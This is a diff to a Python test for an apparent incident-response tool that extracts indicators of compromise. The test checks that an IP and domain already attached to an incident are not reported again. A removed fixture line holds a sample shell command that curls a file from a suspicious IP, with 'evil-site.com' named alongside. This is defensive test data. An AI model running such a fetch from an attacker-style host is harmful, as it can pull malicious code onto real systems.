@@ -881,17 +881,15 @@ def test_what_the_incident_holds_already_is_not_found_again(admin: TestClient):
     doc = {
         "id": "i1",
         "name": "curl to 185.220.101.47 and evil-site.com",
-        "data": {
-            "commands": {"shells": {"bash": {"commands": [{"command": "curl http://185.220.101.47/x", "time": 1}]}}}
-        },
+        "data": {"iocs": {"manual": [{"type": "ip", "value": "185.220.101.47", "source": "commands:bash"}]}},
     }
     assert admin.post("/api/incidents", json=doc).status_code == 201
-    # The address is the incident's from its shell history: only the name is new.
+    # The address is the incident's already (somebody added it): only the name is new.
     assert [row["value"] for row in listing(admin)["found"]] == ["evil-site.com"]
     held = iocs(admin)
     assert held[("ip", "185.220.101.47")] == ["commands:bash"] and held[("domain", "evil-site.com")] == [
         "found:incident.name"
     ]
     with SessionLocal() as db:
-        assert db.scalar(select(func.count()).select_from(IocEntry).where(IocEntry.incident_id == "i1")) == 3
+        assert db.scalar(select(func.count()).select_from(IocEntry).where(IocEntry.incident_id == "i1")) == 2
     assert json.dumps(listing(admin)["scan"]["byType"]) == '{"domain": 1}'
